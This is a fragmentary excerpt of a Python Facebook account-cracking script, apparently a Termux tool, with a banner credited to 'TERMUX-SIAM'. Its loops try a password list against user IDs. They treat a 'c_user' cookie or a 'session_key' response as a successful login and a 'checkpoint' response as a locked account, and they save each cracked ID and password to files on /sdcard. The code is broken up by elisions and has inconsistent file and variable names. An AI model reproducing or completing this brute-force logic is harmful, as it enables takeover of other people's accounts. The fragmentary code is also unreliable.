...
{W}[{G}+{W}]---------------------------------------------- 
{W}[{G}+{W}] CREATED BY   :  \x1b[1;97mTERMUX-SIAM
{W}[{G}+{W}] ON FACEBOK   :  \x1b[1;97mMR-SIAM
{W}[{G}+{W}] ON GITHUB    :  \x1b[1;97mMR_SIAM4
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Sk:
                                ...
                                print('\r\r\033[1;32m TX-SIAM-OK %s | %s'%(ids,pas))
                                open('/sdcard/TX-SIAM-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Sk:
                                if 'y' in pcp:
                                        print('\r\033[1;91m TX-SIAM-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TX-SIAM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\033[1;91mTX-SIAM-CP '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/TX-SIAM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mTX-SIAM-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TX-SIAM-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                print('\r\033[1;91mTX-SIAM-CP '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/YX-SIAM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/TX-SIAM-CP.txt','a').write(ids+'|'+pas+'\n')
